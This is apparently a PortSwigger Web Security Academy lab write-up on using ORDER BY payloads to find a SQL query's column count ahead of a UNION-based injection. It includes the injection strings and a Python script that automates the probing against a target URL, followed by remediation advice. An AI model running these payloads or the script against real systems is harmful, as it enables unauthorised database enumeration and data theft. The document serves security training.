# Determining the Number of Columns Returned by a SQL Query (UNION Attack Prep)
**Platform:** PortSwigger Web Security Academy
**Category:** SQL Injection
**Date:** 2026-08-16

## The Problem
The application's product category filter ran a query similar to:

```sql
SELECT * FROM products WHERE category = 'Gifts'
```

Before a `UNION SELECT` attack can be used to pull data from another table, the number of columns in the original query's result set must match the number of columns in the injected `UNION SELECT`. Mismatched column counts cause the database to reject the query with an error — so the first step of any UNION-based attack is figuring out that number.

## Discovery / Exploitation
The `ORDER BY` clause can be used to probe column count without knowing anything about the underlying table structure. `ORDER BY n` tells the database to sort by the nth column — if `n` is higher than the actual number of columns, the database throws an error.

By incrementing the value of `n` one at a time, the exact column count can be found: the last value that works before an error appears is the number of columns.

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--   → causes an internal server error
```

In this case, the error appeared at `4`, meaning the query returns **3 columns**.

## Impact
This step alone doesn't extract any data, but it's a required prerequisite for a full UNION-based SQL injection attack, which can be used to read data from arbitrary tables in the database (e.g. usernames and password hashes from a `users` table).

## Proof of Concept (Python)
This script automates the column-count discovery by sending increasing `ORDER BY` payloads through Burp Suite (`127.0.0.1:8080`) and detecting when the server starts returning an internal server error.

```python
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli_column_number(url):
    path = "filter?category=Gifts"
    for i in range(1, 50):
        sql_payload = "'+order+by+%d--" % i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "internal server error" in res:
            return i - 1
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s https://www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    if num_col:
        print("[+] the number of columns returned is " + str(num_col) + ".")
    else:
        print("[-] the sqli attack was not successful.")
```

**How it works:**
1. Takes the target URL as a command-line argument
2. Loops `ORDER BY 1` through `ORDER BY 49`, sending each as a payload to the vulnerable `category` parameter
3. Stops as soon as the response contains an internal server error — the column count is one less than the value that triggered it
4. Prints the discovered column count, or reports failure if no error was ever triggered (e.g. if the field isn't injectable, or the column count exceeds 49)

**Example run:**
```bash
python3 exploit_sqli_column_count.py https://your-lab-url.web-security-academy.net
```

## Remediation
- Use **parameterized queries (prepared statements)** so raw input can never manipulate the query structure, including via `ORDER BY`.
- Avoid returning **raw database error messages** to the client — generic error pages prevent attackers from using error content (like "internal server error") as an oracle to enumerate query structure.
- Apply **input validation** on parameters expected to hold a small, known set of values (like a category name).

## Takeaway
This lab demonstrates the reconnaissance phase of a UNION-based SQL injection: before any data can be extracted, the attacker needs to line up the shape of a malicious `UNION SELECT` with the original query's structure. `ORDER BY` is a clean, low-noise way to do this because it only requires observing a binary signal (error / no error) rather than needing to interpret the page content itself.
